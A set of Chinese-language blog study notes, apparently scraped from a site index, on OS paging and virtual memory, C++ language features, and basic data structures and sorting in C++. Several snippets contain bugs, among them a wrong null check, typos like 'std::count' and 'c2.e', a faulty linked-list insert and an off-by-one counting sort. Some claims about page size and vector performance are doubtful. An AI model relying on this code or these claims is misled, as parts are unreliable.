现在大多数操作系统使用\n将物理内存分为固定大小的块（16kb），成为页帧；逻辑内存分为同样大小的快，称为页面\n逻辑内存是连续的，但物理内存可能不是\nCPU生成地址分成页码和页偏移，页码是页表的索引，页表和段表类似\n页的大小为2的幂，地位表示页偏移，高位表示页码\n不会产生外部碎片，但是可能有内存碎片，如果进程要求内存不是页的整数倍\n内存中的帧要大于进程中的页\nTLB转换表缓冲区\nTLB命中：页面在TLB中\n共享页 共享公共代码，但是每个进程有自己的数据页\n可重入代码：不能自我修改，所以多个进程可以执行相同代码\n页表结构 分层分页：减少内存所占页表空间，缺点但要多出一次访问\n哈希页表\n倒置页表：整个系统只有一个页表，每个条目保存一个地址空间标识符（PID）系统内每个虚拟地址\u0026lt;进程ID,页码，偏移\u0026gt;，每个地址\u0026lt;进程ID,页码\u0026gt;，减少了内存空间，但是增加查找空间\n虚拟内存管理 允许执行进程不必完全处于内存\n为什么在许多情况下并不需要将整个程序置于内存中？ 1。程序有处理异常错误条件的代码，这些代码几乎不执行\n2.数组，链表和表等分配的内存量通常多于实际需要值\n3.程序的某些选项和功能可能很少使用\n虚拟内存将逻辑内存和物理内存分开\n请求调页：对于请求调页的虚拟内存，页面只有在程序执行期间被请求时才加载。调页程序会猜测在该进程被再次换出之前会用到哪些页，需要硬件支持来区分内存的页面和磁盘的页面，使用有效-无效位（不在逻辑内存里，或有效但只在磁盘上），这是系统试图改善几桶使用率和吞吐量\n缺页错误：访问标记为无效的页面\n页面置换：发生缺页错误，但是列表没有空闲帧，系统交换出一个进程释放所有帧并降低多道程序\n页面置换算法：FIFO，调出最旧的页面；最优页面置换，调出置换最长时间不会使用的页面，LRU最近最少使用算法，基于计数的页面置换\n","date":"2025-04-05T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/os/","title":"OS"},{"content":" static和extern区别？ 外部是可见性关键词，内部是所有实例共享static的变量，静态类成员变量属于全体实例，所以任意实例不能给静态变量分配内存，要用类使用变量，static让被修饰的语句具有唯一性，确定性\n为什么要在类内设置static？ 如果没有设定为static，连接器会跨编译单元进行连接（外部链接），尽可能让函数和变量变成静态（内部链接），除非需要跨编译单元进行连接。不能在静态方法中访问实例化对象里的非静态变量；static可以将被修饰的生存期延长到整个程序，静态成员只需要一个初始化，而没有静态的成员每次调用都会初始化\n构造对象时都会调用构造函数 为什么要写析构函数？ 在对象被销毁时被调用，想到于给一个反馈，比如~Entity(){std::cout\u0026laquo;\u0026ldquo;Destroyed Entity!\u0026quot;\u0026laquo;std::endl;}\n可见性 private（只有这个类可以访问这些变量）,public,protected（在层次结构中的子类可以访问这些符号）\n为什么要用可见性，哪里要用到，为什么所有不用public？ 可见性或许和性能无关，不是CPU需要理解的，但是增加代码的维护性，例如private规定一些东西不能被破坏\n比较int example[5]和int* another = new int[5],为什么要动态的用new来分配，而不是在栈上创建？ 生存期。用new在堆上创建，将一直存在直到手动回收\n为什么使用mutable? 在类中修改特定成员变量（const）\n什么时候用栈，什么时候用堆？ 栈：作用域结束，内存释放，栈内存回收，如果想让在作用域之外依然存在，就不能分配到栈上，如果类/对象太多，栈没有足够的空间，分配在堆上（例：Entity* entity=new Entity(\u0026ldquo;Cherno\u0026rdquo;)）,显式的控制对象的生存期，但是麻烦，需要手动delete，可能会导致内存泄露，而栈方便自动\n创建new的过程 找到一个足够大的内存块，给一个指向那块内存块的指针（内存地址 ），调用构造函数，记得delete！\nthis是一个常量指针，但是可以修改this指向对象的内容\n智能指针的本质？为什么要用智能指针？ 原始指针的包装，调用new并分配内存，基于使用的智能指针，自动释放。好处，不会得到没有引用的悬空指针，从而造成内存泄露，在unique_ptr中不调用new是因为它安全，而shared_ptr需要分配另一块内存，叫做控制块，用来存储引用计数，当引用计数为0时shared_ptr不存在；有限使用unique_ptr,但在对象之间共享，不能使用unique_ptr时，就使用shared_ptr。\n为什么要重写C++中存在的数据结构？ 标准模板库的速度不是优先考虑的东西\n关于动态数组？ std::vector vertices;\u0026lt;\u0026gt;内可以是int，与java不同，C++可以传递数据类型\n为什么存储vertor对象比存储指针在技术上更优？ vertor内存分配时连续的数组，没有内部碎片，更方便读取，但是vector读取更慢，指针直接指向内存地址，更快\nvector如何重新分配多余的元素？ 从内存中的就位置复制到内存中的新位置，然后删除旧位置的内存，\n静态链接和动态链接的实际性能差异？ 静态链接允许更多优化发生，dll是动态链接库，lib文件其实就是指向ddl文件的指针，如果用不同的静态库，在运行时连接到ddl，会得到不匹配的函数\nC++中如何处理多返回值\nC++模板,在哪里可以使用模板？在哪里不可以使用？\n模板允许用户定义一个可以根据用途进行编译的模板，就是让编译器基于一个规则为人写代码\n1 2 3 4 5 template \u0026lt;typename T\u0026gt; void Print(T value){ std::count \u0026lt;\u0026lt; value \u0026lt;\u0026lt;std::endl; } Print\u0026lt;std::string\u0026gt;(5) T被string所替代\n模板只有在它被调用时才会被创建，因为它只是代码，才会被创建,报错取决于编辑器\n1 2 3 4 5 6 7 template\u0026lt;T N\u0026gt; class Array{ private: T m_Array[N]; public: int GetSize() const { return N;} } 日志系统，包含不同类型的统一缓冲区时，但是模板变复杂容易找不到错误在哪\nC++中的堆与栈是如何分配内存的？ 1 2 3 int a=5; int* b =new int; *b =5; shift，又是堆栈\n应用程序启动后，操作系统要做的就是将整个程序加载到内存，并分配一大堆物理RAM，堆与栈是RAM中实际存在的两个区域，栈通常是一个预定义大小的内存区域，2M左右，堆也是预定义了默认值，但可以生长。我们的内存中有两个不同的区域，内存是用来实际存储数据的，需要另一个存储运行所需的数据，不管是局部变量还是从文件中读取的东西，当我们想要存储一个整数时，把栈指针移动4个字节，（就像一条CPU指令？）所以栈分配很快，而堆调用malloc的函数，浏览空闲列表，给一个指针，记录。\nauto自动推导类型，那么好用，为什么不全部用auto？ 迭代器声明可以用用，有些类型需要明确语义，如接口返回值，避免隐式转换\n静态数组std::array 在栈上创建，有边界检查\nlambda 在我们会设置函数指针指向函数的任何地方，都可以将它设置为lambda\n为什么需要结构体？ 1 2 3 4 5 6 struct Object{ int weight; int value; } e[array_length];//一个类型为Object的数组 const Object a； 限制了成员元素的使用，避免混淆，有需要用到value[],Value[]，不同的结构体可以拥有相同名字的成员元素，同名的成员元素相互独立。访问/修改成员元素(*ptr).v=tmp,ptr-\u0026gt;v=tmp修改结构体中的成员元素\nunion和struct区别？ union所有成员共享内存，而struct每个成员有独立内存，union大小=最大成员大小，struct大小\u0026gt;=所有成员大小之和，union修改一个成员会影响其他成员，struct修改以一个成员不影响其他成员\n一些指针注意事项？ 指针变量的大小在不同环境下有差异。在 32 位机上，地址用 32 位二进制整数表示，因此一个指针的大小为 4 字节。而 64 位机上，地址用 64 位二进制整数表示，因此一个指针的大小就变成了 8 字节。\n1 2 3 4 5 int* pa = \u0026amp;a； (*px).a=4; px-\u0026gt;b =5; C++程序基本要素 程序由语句组成，包括声明语句和执行语句\n语句由基本要素组成：标识符，关键字，常量（不占空间），变量，运算符，表达式\nC++对C的扩充\nC++函数声明不可以省略 变量声明语句不要求放在函数和语句块的开始位置 强制类型转换，增加形式 int（a），类似函数调用 C++用new和delete运算符取代C中的malloc()和free() C++提供字符串类string，替代C字符数组 C++用控制台输入输出流对象（iostream）替代C的stdio函数库， 数据类型 基本数据类型： 从低级到高级是自动转换，高级转低级会有风险，因为会丢掉一部分\n强制转换不安全，所以要指明，如\n1 2 3 float x=123.56; int i =(int)x 为什么要有变量的类型？可以没有吗？ 变量类型确定长度，变量名确定起点，有了起点和长度，可以知道在内存中取的地址。如果一门语言设计的可以从其他地方知道终点，那就可以没有变量类型\n数组 一组具有相同类型数据的有序集合\n如何处理不同类型数据？ 结构体\n数组的维数为什么是常量表达式？ 因为要分配给定的空间，不可变（和编译器有关），所以不可以是变量\n！C++源程序编译时，为了保证编译和运行的效率，C++编译系统不对数组下标进行越界检查，程序运行时系统也不会提出越界警告，所以小心，以免破坏其他存储单元的数据\n一些初始化的特殊情况\n初始值的个数可以比数组元素个数少\n1 int a[2][3]={2,3,4}; 当提供全部初始值时，一维的长度可以省略\n1 2 float grade[]={90.0,75.0,85.0} int a[][3]={{2,4,6},{8,10,12}} 指针 任何变量都有一个内存地址，该地址称为指针，而指针变量是一种存放内存地址的变量\n1 2 3 4 5 int* pointer; int a=10; int* pa=\u0026amp;a; 指针与数组 指针代替下标引用数组元素，使数组的使用更加灵活有效，\n数组名表示数组在内存中的首地址（见数据类型问题）\n程序循环中的pa可以换成a吗？ 不可以，数组名就是常指针，而常指针不可变\n1 2 3 4 5 6 7 int a[]={0}; int* pa=a;//a就是\u0026amp;a[0] ...... result+=pa*; pa++; 字符串 C++语言没有提供字符串类类型，字符串变量作为以为字符串数组处理\nC++编译程序自动在字符串的末尾加上字符’\\0‘（字符串结束符），求字符串长度时不能将它计算在内\n转义字符\u0026rdquo;\\\u0026ldquo;\u0026ldquo;表示双引号\n两种初始化写法，比较不同\n1 2 3 4 5 char s[]={\u0026#34;hello\u0026#34;}; char s[]=\u0026#34;hello\u0026#34;;//6个元素 char *ps = “hello”; const char *ps =\u0026#34;hello\u0026#34;;//C++ 11标准 上面的常量是不占系统内存，拷贝一份到数组，但下面那个有指针指向它，占内存空间，只要有指针不被释放，就不能删内存空间。但是两者内存空间想用\nconst 必须初始化\n1 2 const int size2 =20; #define size1 20 符号常量和const常量一样吗？该选哪个？ 推荐第一种。宏定义在预编译时作文本替换，不做类型检查，而const在编译时会进行类型检查\n常指针和常值变量指针 1 2 double* const p1=\u0026amp;x;//常指针，地址不能变 const double *p2 =\u0026amp;x;//常值变量指针，值不能变 普通指针不能指向常值变量，常值变量不能指向普通指针\n结构体 结构属于构造类型，是由多种类型的数据组成\n结构中的每个数据项位成员\n1 2 3 4 5 6 7 //定义结构体 struct staffer{ int ID; char name[20]; bool sex; float salary; } 例子:两种访问形式\n1 2 3 4 5 6 7 void eg2_11_0{ staffer employee1={110,\u0026#34;liming\u0026#34;,1,23678.39}; staffer employee2= employee1; employee2.ID=234543; staffer* pstaff = \u0026amp;employee2; pstaff -\u0026gt; salary =1000.00; } 数组名name即\u0026amp;name[0]是个常值变量，所以不能写成employee2.name= \u0026ldquo;WangPing\u0026rdquo;;\n要写成拷贝字符串 strcpy(employee2.name,\u0026ldquo;Wangping\u0026rdquo;)\n枚举 允许用符号常量代表数据\n1 2 3 4 enum Color {Red,Green,Blue};//Red对应0，Green对应1，Blue对应2，这是默认的 Color color1 =Red; cout \u0026lt;\u0026lt; color1 \u0026lt;\u0026lt; endl; enum Weather {windy=2,rainy=-1,cloudy,sunny=3};//cloudy的常量是-1+1 枚举类型有什么用？为什么不直接用枚举常量对应的数值？ 增加程序的可读性\ntypedef\n对原有的数据类型定义一个新的名称\n1 2 3 4 5 6 7 8 9 10 typedef int INT32; INT32 i=1;//就是int i=1 typedef struct tagDate{ int year; int month; int day; } DATE; INT32 i = 0; DATE today = {2025,4,1} 使用typedef类型定义有什么用？ 增加程序的可移植性（不用全局改，只用改一句就行），可读性，用户自定义\n控制语句 1 2 3 4 5 6 7 8 9 if...else if ....else.... switch{ case \u0026#39;A\u0026#39;: cout \u0026lt;\u0026lt; \u0026#34;优秀\u0026#34;; } 注意加break！\nswitch语句单入口多出库，一通百通\n如果没有break，几个case会一直执行下去\nfor语句执行顺序？ 1 2 3 4 5 for(\u0026lt;表达式1\u0026gt;;\u0026lt;表达式2\u0026gt;;\u0026lt;表达式3\u0026gt;){ \u0026lt;语句\u0026gt; } 先对表达式1求值，然后对表达式2求值，如果表达式2为真，执行循环体，执行完循环体，对表达式3求值，完成一次循环，再对表达式2求值，决定是否进行下一次循环\ndo-while语句\n至少循环一次，先循环再判断\n三种循环语句比较？ for：循环次数条件明确\nwhile：循环条件明确\ndo\u0026hellip;while\u0026hellip;.至少循环一次\n函数声明 C++允许函数调用在前，定义在后\n此时要求在调用前必须进行函数声明，把函数名，函数类型，形参告诉编译系统，以便调用时进行语法检查，函数声明放*.h，函数定义放 *.cpp 函数调用过程：中断当前函数的执行，将程序的执行流程转移到被调用函数，并将输参传递给形参，调用结束后返回主调函数\n例子：地址，引用\n1 2 3 4 5 6 7 8 9 10 11 12 void swap1(int* x,int* y){ int temp = *x; *x =*y; *y=temp; } void swap2(int\u0026amp; x,int\u0026amp; y){ int temp =x; x=y; y=temp; } swap1(\u0026amp;a,\u0026amp;b); swap2(a,b); 内联函数 调用函数时，系统要进行现场处理工作，需要占用附加的现场处理时间\n把函数体直接嵌入函数调用处，则可消除附加的现场处理的事件开销，提高程序的运行效率 调用内联函数时不发生控制转移，知识在编译时把函数体嵌入到调用出 内联函数的定义：\n在函数头前加入关键字inline 当编译程序遇到内联函数调用语句时，会将内联函数的函数体替换调用语句 优缺点\n加快代码调用速度 增加内存的空间开销 函数默认参数\n有多个默认参数，应该放在参数表的右侧\n调用时，若省略某实参，则该实参右边的所有实参都必须省略\n若省略实参，则默认值传递给形参\n引用\n另一个变量的别名\n声明引用时，必须对其进行初始化 编译器一般将引用实现为const指针，即指向位置不可变的指针，本质是同一个白能量并且占用相同的内存单元，只是名字不一样 1 2 int i=10; int\u0026amp; r=i; r和i占用的是同一个内存空间，只是两个不同名字\n引用一般作为函数参数，能让代码更好看\n编译预处理指令 include文件包含 define宏定义：不进行类型检查，注意宏的安全，带括号 1 #define ((a)\u0026gt;(b)?(a):(b)) 条件编译 决定哪些源程序段将被编译，哪些源程序段将不被编译\n#if\u0026hellip;\u0026hellip;#else\u0026hellip;\u0026hellip;#endif\u0026hellip;\u0026hellip;\n主要作用：管理测试与生产代码\n作用域和生存期区别和关系 作用域是变量在源程序中的一段静态区域 变量的生存期是指从创建到撤销（分配内存空间到释放） 有些变量没有生存期，但有作用域，有时变量虽然在生存期，但不在作用域 变量的内存分配方式 自动分配（运行），静态分配（编译时），动态分配（运行时）\n变量的存储类型 auto:内部变量，存储在栈上\nregister：内部变量，存储在寄存器中\nextern：外部变量\nstatic：内部或外部变量\n未指定存储类型，内部默认为auto，外部默认为extern\n作用域 例：全局变量\n1 extern int b 引用外部变量，不开辟内存空间\n例：静态变量\n并不会因为函数调用结束而释放内存\n比较以下两种：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 void fun(){ int a=0; a++; cout \u0026lt;\u0026lt; \u0026#34;a=\u0026#34; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; endl; } a=1,a=1 void fun(){ static in a=0; a++; cout \u0026lt;\u0026lt; \u0026#34;a=\u0026#34; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; endl; } a=1,a=2 void exp(){ for(int i=0;i\u0026lt;2;i++){ fun(); } } 作用域限定符::\n1 2 3 4 5 6 int amout=123;//全局变量 void sg2_33(){ int amount =456;//局部变量 cout\u0026lt;\u0026lt;::amout\u0026lt;\u0026lt;endl;//123 cout\u0026lt;\u0026lt;amout\u0026lt;\u0026lt;endl;//456 } 命名空间\n命名空间可避免全局标识符同名引起冲突，是对一些成员进行声明的一个描述性区域\n引入命名空间后，标准C++库都定义在std中（using namespace std）\n函数的存储类型 内部函数static：只能被以同一个源文件中的函数调用\n外部函数extern：可以被其他源文件中的函数调用\n动态分配内存 动态分配是指在程序运行时为程序中的变量分配内存空间，它完全由应用程序自己进行内存的分配和释放，在堆上分配\n（一般来说，编译器在编译阶段就自动将管理这些空间的代码加入到目标文件中，程序运行后由系统自动为变量分配内存空间，在作用域结束后自动释放内存空间）\n内存的动态分配与释放 C语言中，动态内存分配时通过调用标准库malloc()和free()实现\nC++中，利用new和delete进行动态内存的分配释放\n1 2 3 4 5 \u0026lt;指针变量\u0026gt; = new \u0026lt;数据类型\u0026gt;； delete \u0026lt;指针变量\u0026gt;； delete[]\u0026lt;指针变量\u0026gt;；//释放动态数组 例子：编程输出斐波那契数列\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 void eg2_36(){ int *f,n; cin \u0026gt;\u0026gt; n; f=new int[n+1]; if(n==nullptr||n\u0026lt;1){ cout \u0026lt;\u0026lt; \u0026#34;Heap error\u0026#34; return; } f[0]=f[1]=1; cout \u0026lt;\u0026lt; f[0] \u0026lt;\u0026lt; f[1] \u0026lt;\u0026lt;endl; for(int i=2;i\u0026lt;=n;i++){ f[i]=f[i-1]+f[i-2]; cout \u0026lt;\u0026lt; f[i] \u0026lt;\u0026lt;endl; } delete []f; } 构造函数和析构函数 如何初始化成员变量？ 成员变量一般都为私有属性，也不能在声明对象后利用赋值运算对成员变量进行初始化，成员变量的初始化一般时利用构造函数来完成\n构造函数：创建对象是系统自动调用的成员函数 析构函数：对象生存期结束时系统自动调用的成员函数 重载 函数重载，运算符重载，函数名相同函数参数的类型不同\n例子：构造函数重载\n1 2 3 4 5 6 7 8 9 class Box{ public: Box(); Box(double h); Box(double h,double w); Box(double h,double w,double d); } //超级构造函数 Box(double h=0,doubke w =0,double d=0); 重载规则\n以下非法\n返回类型不能不同\nlong fun(int);\nfloat fun(int);\n不能利用引用重载 1 2 3 void fun(int\u0026amp;) void fun(int) const可用于重载 1 2 3 void fun(); void fun() const; 运算符重载\n输出流运算符函数原型 ostream\u0026amp; operator\u0026laquo;(ostream\u0026amp; os,\u0026lt;操作对象\u0026gt;)\n加法运算符函数原型 \u0026lt;返回类型\u0026gt; operator+(\u0026lt;操作对象\u0026gt;，\u0026lt;操作对象\u0026gt;)\n自增运算符函数类型 \u0026lt;返回类型\u0026gt; operator++(\u0026lt;操作对象\u0026gt;)\n下标运算符函数类型 \u0026lt;返回类型\u0026gt;\u0026amp; operator[\u0026lt;操作对象\u0026gt;，int i]\n例子：加法运算符重载，复数相加(普通函数)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 class CComplex{ private: double r,i; public: CComplex(double r=0,double i=0); virtual ~CComplex(); friend CComplex operator+(CComplex c1,CComplex c2); }; CComplex operator+(CComplex c1,CComplex c2){ CComplex Ctemp; CTemp.r = c1.r+c2.r; CTemp.i = c1.i+c2.e; return CTemp; } 例子：自增运算符重载\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Counter{ private: int value; public: Counter(){ value = 0;} Counter operator++();//前缀运算符 Counter operator++(int);//后缀运算符 void display(){ cout \u0026lt;\u0026lt; \u0026#34;value:\u0026#34;\u0026lt;\u0026lt;value \u0026lt;\u0026lt; endl; } }; Counter Counter::operator++(){ value++; return *this; } Counter Counter::operator++(int){ Counter temp; temp.value=this-\u0026gt;value++; return temp; } 写成++i前缀运算符效率更高，不用创建临时变量\n模板 函数模板\n编译器根据函数实参的数据类型确定模板参数T，再自动生成对应的函数，即模板函数\n1 2 3 4 5 6 7 8 9 10 template \u0026lt;class T\u0026gt;; T my_abs(T val){ return (val\u0026lt;0)?-val : val; } void eg4_22(){ int i=100; long l=-123456L; float f=-12.78F; cout\u0026lt;\u0026lt;my_abs(i)\u0026lt;\u0026lt; my_abs(l)\u0026lt;\u0026lt;my_abs(f)\u0026lt;\u0026lt;endl; } 类模板\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 //内部定义成员函数 template \u0026lt;typename T\u0026gt; class MyTemClass{ private: T x; public: void setX(T a){ x=a;} void getX(){ return x;} } //外部定义成员函数 template \u0026lt;typename T1\u0026gt; void MyTemClass\u0026lt;T1\u0026gt;::setX(T1 x) { this-\u0026gt;x=x; } template \u0026lt;typename T\u0026gt; void MyTemClass\u0026lt;T\u0026gt;::getX(){ return this-\u0026gt;x; } 含多个参数的类模板\n1 2 3 4 template \u0026lt;typename T1,int i,typename T2\u0026gt; class MyClassM{}; //实例化 MyclassM\u0026lt;int,100,float\u0026gt; MyObject; ","date":"2025-03-30T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E4%B8%80%E4%BA%9B%E5%AF%B9%E4%BA%8Ec-%E7%9A%84%E6%80%9D%E8%80%83/","title":"一些对于C++的思考"},{"content":"栈 LIFO\n用数组模拟栈 1 2 3 4 5 6 7 8 9 int st[N];//元素数量，栈顶下标 //压栈 st[++*st]=var1; //取栈顶 int u =st[*st]; //弹栈，*st==0时不能继续弹出 if(*st) --*st; //清空栈 *st =0 ; STL中的栈 1 2 3 4 //引入stack头文件，container默认使用stf::deque template\u0026lt; class T,class Container = std:deque\u0026lt;T\u0026gt; \u0026gt;class stack; 容器必须提供以下函数，如std::vector,std::deque和std::list\nback() push_back() pop_back() stack容器常用函数\nst.top() st.push() st.pop() st.empty() st.size() 1 2 3 4 5 6 7 8 //新建两个栈st1和st2 std:stack\u0026lt;int\u0026gt; st11,st2; //为st1装入1 st1.push(1); //赋值 st2=st1 //输出栈顶 cout \u0026lt;\u0026lt; st2.top() \u0026lt;\u0026lt; endl; 队列 FIFO\n用数组模拟一个队列，用两个变量标记队列的首尾 1 int q[size],ql=1,qr; 1 2 3 4 5 6 7 8 9 插入元素：q[++qr]=x; 删除元素：ql++; 访问队首：q[ql]; 访问队尾：q[qr]; 清空队列：ql=1，qr=0； 双端队列 1 2 3 4 5 //引入\u0026lt;deque\u0026gt;头文件 template\u0026lt; class T,//数据类型 class Allocator = std:allocator\u0026lt;T\u0026gt;//适配器 \u0026gt;class deque; std::deque容器常用函数\n元素访问 1 2 q.front(); q.back(); 修改 1 2 3 4 5 6 q.push_back() q.pop_back() q.push_front() q.pop_front() q.insert() q.erase() 容器 1 2 q.empty() q.size() 循环队列 采用循环的方式组织存放队列元素的数组，将下标为0的位置看作最后一个位置后继，如(n+1)%size\n例题\n一个双端队列（deque），m 个事件：\n在前端插入 (w,v) 在后端插入 (w,v) 删除前端的二元组 删除后端的二元组 链表 构建链表 单向链表\n1 2 3 4 struct Node{ int value; Node *next; }; 双向链表\n1 2 3 4 5 struct Node{ int value; Node *next; Node *right; } 向链表插入数据 单向链表\n1 2 3 4 5 6 void insertNode(int i,Node *p){ Node *node = new Node; node-\u0026gt;value = i; node-\u0026gt;next = p-\u0026gt;next; p-\u0026gt;next = node; } 单向循环链表\n先判断原链表是否为空，为空则自身循环，不为空则插入数据\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 void insertNode(int i,Node *p){ //初始化 Node *node = new Node; node-\u0026gt;value =i; node-\u0026gt;next = NULL; //判断是否为空 if(p == NULL){ p = node; node-\u0026gt;next = node;//指向自己 }else{ node-\u0026gt;next = p-\u0026gt;next; p-\u0026gt;next=node; } } 双向循环链表 除了要判断给定链表是否为空外，还要修改左右指针\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 void insertNode(int i,Node *p){ Node *node =new node; node-\u0026gt;value=i; if(p == NULL){ p = node; node-\u0026gt;left=node; node-\u0026gt;right=node; }else{ node-\u0026gt;right = node-\u0026gt;right; node-\u0026gt;left=node; p-\u0026gt;right-\u0026gt;left=node; p-\u0026gt;right=node; } } 从链表中删除数据 单向链表 利用虚拟节点\n删除 t。此时虽然原结点 p 的地址还在使用，删除的是原结点 p-\u0026gt;next 的地址，但 p 的数据被 p-\u0026gt;next 覆盖，p 名存实亡。\n1 2 3 4 5 6 void deleteNode(Node *p){ p-\u0026gt;value = p-\u0026gt;next-\u0026gt;value;//保存p下一个结点的值 Node *t = p-\u0026gt;next;//利用虚拟结点保存p-\u0026gt;next p-\u0026gt;next = p-\u0026gt;next-\u0026gt;next; delete t; } 双向循环链表\n1 2 3 4 5 6 7 void deleteNode(Node *p){ p-\u0026gt;left-\u0026gt;right=p-\u0026gt;right; p-\u0026gt;right-\u0026gt;left=p-\u0026gt;left; Node *t =p; p=p-\u0026gt;right;//将 p 的右节点地址赋给 p，以避免 p 变成悬垂指针； delete t; } 树 存储 父节点parent[N]\n左右兄弟\n1 2 3 4 5 6 7 int v=child[u]; while(v!=EMPTY_NODE){ //... v=sib[v]; } 二叉树，记录每个节点的左右子节点\n1 2 3 4 int parent[N]; int lch[N],rch[N]; // int child[N][2]; 先序遍历（根，左，右）\n1 2 3 4 5 6 7 void preorder(BiTree* root){ if(root){ cout \u0026lt;\u0026lt; root-\u0026gt;key\u0026lt;\u0026lt; \u0026#34;\u0026#34;; preorder(root-\u0026gt;left); preorder(root-\u0026gt;right); } } 中序遍历(左，根，右)\n1 2 3 4 5 6 7 void inorder(BiTree* root){ if(root){ inorder(root-\u0026gt;left); cout\u0026lt;\u0026lt;root-\u0026gt;key\u0026lt;\u0026lt;\u0026#34;\u0026#34;; inorder(root-\u0026gt;right); } } 后序遍历（左，右，根）\n1 2 3 4 5 6 7 void postorder(BiTree* root){ if(root){ postorder(root-\u0026gt;left); postorder(root-\u0026gt;right); count\u0026lt;\u0026lt;root-\u0026gt;key\u0026lt;\u0026lt;\u0026#34;\u0026#34;; } } BFS遍历\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; levelOrder(Node* root){ if(!root){ return {}; } vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; res; queue\u0026lt;Node*\u0026gt; q;//队列 q.push(root);//将根节点加入队列 while(!q.empty()){ int currentLevelSize = q.size();//获取当前层节点数 res.push_back(vector\u0026lt;int\u0026gt;()); //为当前层创建新的向量 //处理当前层的所有节点 for(int i =0;i\u0026lt;currentLevelSize;++i){ Node* cur = q.front(); //获取队首节点 q.pop(); //弹出队首节点 res.back().push_back(cur-\u0026gt;val);//将节点值加入当前层 //将子节点加入队列 for(Node* child:cur-\u0026gt;children){ q.push(child); } } } } Morris遍历\nMorris 遍历的实质是避免使用栈，利用底层节点空闲的 right 指针指回上层的某个节点，从而完成下层到上层的移动。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 void mooris(TreeNode* root){ TreeNode* cur = root; while(cur){ if(!cur-\u0026gt;left){ std::cout\u0026lt;\u0026lt;cur-\u0026gt;val\u0026lt;\u0026lt;\u0026#34; \u0026#34;; cur=cur-\u0026gt;right; continue; } //找到当前节点的左子树的最右节点 TreeNode* mostRight = cur-\u0026gt;left; while (mostRight-\u0026gt;right \u0026amp;\u0026amp; mostRight -\u0026gt;right !=cur){ mostRight = mostRight-\u0026gt;right; } if(!mostRight-\u0026gt;right){ //如果最右节点的right指针为空，将其指向当前节点，并进入左子树 mostRight -\u0026gt; right =cur; cur = cur -\u0026gt;left; }else{ //如果最右节点的right指针指向当前节点，说明左子树已经遍历完毕，输出当前节点的值并进入右子树 mostRight-\u0026gt;right =nullptr; std::cout \u0026lt;\u0026lt; cur-\u0026gt;val \u0026lt;\u0026lt; \u0026#34; \u0026#34;; cur = cur-\u0026gt;right; } } } 排序 稳定性？指相等的元素经过排序之后相对顺序是否发生了改变\n选择排序 用数组实现不稳定\n每次找出第i小的元素，然后将这个元素与数组第i个位置上的元素交换\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;utility\u0026gt; void selection_sort(int* a,int n){ for(int i=1;i\u0026lt;n;++i){ int ith = i; for(int j=i+1;j\u0026lt;=n;++j){ if(a[j]\u0026lt;a[ith]){ ith =j; } } std::swap(a[i],a[ith]); } } 每次遍历i=1-n，固定i，遍历后面所有数(j)，如果后面数比前面数小，记住这个数的位置，结束后将他们交换\n冒泡排序 稳定\n每次检查相邻两个元素，如果前面的元素与后面的元素满足给定的排序条件，就将相邻两个元素交换。当没有相邻的元素需要交换时，排序就完成了。\n最坏情况，要会执行n-1+n-2+\u0026hellip;\u0026hellip;+1次交换操作\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 void bubble_sort(int *a,int n){ bool flag =true; while(flag){ flag= false; for(int i=1;i\u0026lt;n;++i){ if(a[i]\u0026gt;a[i+1]){ flag=true; int t=a[i]; a[i]=a[i+1]; a[i+1]=t;//交换 } } } } QA：为什么flag放在循环里面？\n只要找到不满足条件的立即停止\n插入排序 稳定，最优n，最坏n^2\n插入排序（英语：Insertion sort）是一种简单直观的排序算法。它的工作原理为将待排列元素划分为「已排序」和「未排序」两部分，每次从「未排序的」元素中选择一个插入到「已排序的」元素中的正确位置。\n一个与插入排序相同的操作是打扑克牌时，从牌桌上抓一张牌，按牌面大小插到手牌后，再抓下一张牌。\n1 2 3 4 5 6 7 8 9 10 11 void insertion_sort(int arr[],int len){ for(int i =1;i\u0026lt;len;++i){ int key = arr[i]; int j =i-1; while(j \u0026gt;=0 \u0026amp;\u0026amp; arr[j]\u0026gt;key){ arr[j+1]=arr[j]; j--; } arr[j+1]=key; } } 从第1个元素开始排序，再取第二个元素，和第一个元素比较，排序，再取第三个元素，和刚跟排序好的最后一个元素比较\u0026hellip;\u0026hellip;\n计数排序 线性时间，稳定\n计数排序的工作原理是使用一个额外的数组C，其中第i个元素是待排序数组A中值等于i的元素的个数，然后根据数组C来讲A中的元素排到正确的位置\n计算每个数出现了几次；\n求出每个数出现次数的前缀和；\n利用出现次数的前缀和，从右至左计算每个数的排名。\nn是数组长度，w是元素值域范围/最大值\n1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;cstring\u0026gt; constexpr int MAXN =1010;//数组最大长度 constexpr int MAXW = 100010;//元素至于范围 int cnt[MAXW];//计数数组，用于统计每个元素出现的次数 int b[MAXN];//输出数组，存储排序后的结果 int* counting_sort(int* a,int n,int w){ memset(cnt,0,sizeof(cnt));//初始化计数数组 for(int i=0;i\u0026lt;=n;++i) ++cnt[a[i]];//统计每个元素出现的次数 for(int i=1;i\u0026lt;=w;++i) cnt[i]+=cnt[i-1];//计算前缀和，确定每个元素最后出现的的位置 for(int i=n;i\u0026gt;=1;--i) b[cnt[a[i]]--]=a[i];//从后向前遍历，将元素放到正确位置 } 输入数组 a: [0, 2, 1, 3, 2, 1] n = 5, w = 3\n步骤1：统计次数 cnt[0] = 1 cnt[1] = 2 cnt[2] = 2 cnt[3] = 1\n步骤2：计算前缀和 cnt[0] = 1 cnt[1] = 3 cnt[2] = 5 cnt[3] = 6\n步骤3：从后向前放置元素 i = 5: 